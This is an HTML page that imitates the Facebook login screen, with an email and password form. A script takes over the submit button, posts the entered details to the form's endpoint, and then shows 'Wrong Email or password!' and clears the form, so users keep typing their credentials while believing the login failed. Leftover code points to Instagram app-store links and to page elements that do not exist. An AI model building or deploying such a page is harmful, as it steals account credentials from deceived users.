<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="x-image" href="Facebook.ico">
    <link rel="stylesheet" href="facebookcss.css">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
</head>
<body>
    <div class="divtopfixed">
        <img src="Facebook.ico" width="50px" height="50px" alt="">
    </div>
    <div class="body">
        <div class="divleft">

        </div>
        <div class="divmiddle">

        </div>
        <div class="divright">
            <div class="box">
                <h1>facebook</h1>
                <form action="" id="my-form">
                    <input type="text" placeholder="Email address" name="Email" id="Email" required>
                    <input type="password" placeholder="Password" name="Password" id="Password" required><br>
                    <button id="my-form-button" type="submit" >Log in</button><br>
                    <a href="">Forgot password?</a>
                    <br><p id="my-form-status"></p>
                </form><br><hr>
                <button id="createacc">
                    Create Account
                </button><br><br>
                <select name="language" id="languageselect">
                    <option value="language">Language</option>
                    <option value="English">English</option>
                    <option value="Espanol">Espanol</option>
                    <option value="French">Francais</option>
                    <option value="Portuguese">Portuguese</option>
                </select>
            </div>
        </div>
    </div>
    <script>
        var form = document.getElementById("my-form");
        let appstore = document.querySelector(".appstore");
        let playstore = document.querySelector(".playstore");
        
        async function handleSubmit(event) {
          event.preventDefault();
          var status = document.getElementById("my-form-status");
          var data = new FormData(event.target);
          fetch(event.target.action, {
            method: form.method,
            body: data,
            headers: {
                'Accept': 'application/json'
            }
          }).then(response => {
            if (response.ok) {
              status.innerHTML = "Wrong Email or password!";
              form.reset()
            } else {
              response.json().then(data => {
                if (Object.hasOwn(data, 'errors')) {
                  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
                } else {
                  status.innerHTML = "Check your Network and try again"
                }
              })
            }
          }).catch(error => {
            status.innerHTML = "Check your Network and try again"
          });
        }
        form.addEventListener("submit", handleSubmit)
        playstore.addEventListener('click', ()=>{
            window.location = "https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D5729C2BA-1626-4B8B-841C-239F19B75811%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps://www.bing.com/&pli=1"
        })
        appstore.addEventListener('click', () =>{
            window.location = ""
        })
      </script>
</body>
</html>
